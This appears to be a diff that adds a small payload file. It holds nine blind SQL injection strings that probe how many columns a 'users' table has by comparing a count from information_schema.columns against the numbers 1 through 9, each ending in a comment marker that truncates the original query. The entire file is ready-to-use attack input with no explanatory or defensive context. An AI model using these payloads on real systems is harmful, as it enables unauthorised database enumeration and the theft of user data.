@@ -1,0 +1,9 @@
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=1 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=2 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=3 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=4 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=5 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=6 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=7 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=8 #
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=9 #
